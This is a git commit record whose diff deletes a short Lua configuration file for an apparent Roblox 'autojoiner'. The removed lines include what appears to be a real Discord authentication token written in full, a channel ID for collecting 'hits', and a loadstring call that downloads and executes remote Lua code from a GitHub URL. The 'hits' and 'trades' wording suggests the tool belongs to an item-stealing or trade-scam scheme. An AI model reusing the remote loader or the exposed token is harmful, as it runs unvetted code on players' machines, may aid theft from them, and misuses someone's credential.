5a23396e5fd681570068ee5feec03101c960fb6f
Lazer247 <lazeray99@gmail.com>
2025-05-17 14:23:26 +0100

    Delete autojoinerofficial.lua

--- autojoinerofficial.lua
+++
@@ -1,5 +0,0 @@
-token = "MTM0NTcxODA5NzI2NDM3NzkwNw.Gt-Zh_.q36Ix3Dd_rbjTtBhulxZ3pvpHumW93N9J2DC4A" -- Discord Token here (DISCORD AUTH TOKEN) TUTORIAL: https://www.youtube.com/watch?v=LnBnm_tZlyU
-channelId = "373041063312228442" -- Channel ID that your hits are in. TUTORIAL: https://www.youtube.com/watch?v=YjiQ7CajAgg
-delay = 0.1 -- How many seconds it will wait to chat after loading is done. If you have problems with not getting trades, try making delay higher (I dont recommend higher than 5)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Lazer247/cammylol/refs/heads/main/autojoiner.lua"))()
